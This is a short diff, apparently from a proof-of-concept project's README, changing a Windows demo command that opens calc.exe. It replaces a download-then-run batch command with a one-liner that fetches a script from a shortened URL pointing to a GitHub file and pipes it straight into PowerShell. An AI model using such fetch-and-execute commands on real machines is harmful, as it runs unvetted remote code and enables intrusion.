@@ -21,7 +21,7 @@ This example depicts a demo "calc.exe" open as a demonstration for Windows users
 (``tinyurl.com/payload`` "points" to ``https://raw.githubusercontent.com/SoftPankek/yubidied/refs/heads/main/verylongthingthatwontfitin38chars``)
 
 ```bat
-curl tinyurl.com/payload -o p.bat && cmd -k p.bat 
+curl -L tinyurl.com/payload | pwsh
 ```
 
 ## DISCLAIMER
